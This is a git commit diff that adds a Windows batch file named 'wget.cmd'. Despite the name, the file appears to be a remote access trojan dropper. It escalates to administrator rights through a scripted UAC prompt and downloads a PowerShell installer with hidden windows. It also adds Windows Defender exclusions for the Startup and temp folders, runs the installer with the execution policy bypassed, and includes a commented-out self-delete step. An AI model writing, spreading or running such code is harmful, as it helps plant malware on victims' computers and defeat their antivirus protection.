4ebf8db854225ce9c7f9086238aa1640f8b0c9a8
gozen-foto <gofoto.zen@proton.me>
2026-04-14 15:12:17 +0530

    Add files via upload

---
+++ wget.cmd
@@ -0,0 +1,40 @@
+REM get admin permissions for script
+@echo off
+:: BatchGotAdmin
+:-------------------------------------
+REM --> Check for permissions
+    if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) else (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+REM --> if error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+REM disable defender
+
+REM rat resources
+powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri GitHub Link of installer' -OutFile 'installer.ps1'";
+Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
+Add-MpPreference -ExclusionPath "$env:temp";
+powershell powershell.exe -Windowstyle hidden -ep bypass ./installer.ps1
+
+@REM self delete
+@REM del wget.cmd
